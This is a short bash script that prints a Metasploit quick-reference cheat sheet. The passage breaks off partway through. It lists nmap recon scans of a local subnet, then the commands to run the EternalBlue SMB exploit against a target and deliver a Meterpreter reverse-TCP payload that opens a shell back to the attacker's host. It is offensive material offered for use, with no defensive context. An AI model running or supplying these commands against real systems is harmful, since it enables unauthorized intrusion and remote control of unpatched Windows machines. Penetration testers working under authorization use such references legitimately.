#!/usr/bin/env bash
# Description: Metasploit Quick Reference — Recon, Exploit, Post-Exploit
# ==============================================================================
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
echo -e "${RED}${BOLD}=== METASPLOIT QUICK REFERENCE ===${NC}\n"
bash "${BASH_SOURCE[0]%/*}/cheatsheets/msf-commands.sh" 2>/dev/null || cat << 'CHEAT'
── RECON ──
  db_nmap -sS -T4 192.168.1.0/24     # Quick scan + DB import
  db_nmap -p- -sV -O target           # Full scan
  hosts; services; vulns              # View results
── EXPLOIT ──
  search smb                          # Find SMB exploits
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS <IP>; set LHOST <IP>; set PAYLOAD windows/x64/meterpreter/reverse_tcp
